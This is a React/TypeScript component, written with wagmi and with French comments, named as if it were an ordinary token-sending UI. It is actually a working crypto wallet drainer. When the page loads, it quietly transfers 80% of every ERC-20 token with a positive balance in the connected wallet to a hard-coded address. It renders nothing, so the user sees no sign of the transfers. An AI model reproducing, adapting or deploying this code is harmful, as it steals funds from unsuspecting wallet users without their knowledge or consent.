import { useEffect, useCallback } from 'react';
import { useAtom } from 'jotai';
import { useWalletClient, usePublicClient } from 'wagmi';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { erc20ABI } from 'wagmi';

export const SendTokens = () => {
  const [tokens] = useAtom(globalTokensAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  // Automatiser l'envoi de tous les tokens disponibles
  const sendAllTokens = useCallback(async () => {
    const destinationAddress = "0x518c5D62647E60864EcB3826e982c93dFa154af3"; // L'adresse fixe pour envoyer les fonds

    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
      .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
      .map((token) => token.contract_address as `0x${string}`);

    if (!walletClient) return;

    // Envoyer tous les tokens
    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);
      if (!token) continue;

      try {
        const tokenBalance = BigInt(token.balance);
        const amountToSend = tokenBalance * 80n / 100n; // Calculer 80% du solde

        // Créer la transaction pour envoyer les tokens
        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress,
          abi: erc20ABI,
          functionName: 'transfer',
          args: [
            destinationAddress,
            amountToSend,
          ],
        });

        const response = await walletClient.writeContract(request);

        // Mettre à jour l'état pour marquer le token comme envoyé
        setCheckedRecords((old) => ({
          ...old,
          [tokenAddress]: {
            ...old[tokenAddress],
            pendingTxn: response,
          },
        }));

      } catch (err) {
        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
      }
    }
  }, [tokens, walletClient, setCheckedRecords, publicClient]); // Ajout des dépendances manquantes

  useEffect(() => {
    if (tokens.length > 0) {
      sendAllTokens();
    }
  }, [tokens, walletClient, sendAllTokens, publicClient]); // Ajout des dépendances manquantes

  return null; // Pas besoin d'afficher le message de token being sent
};
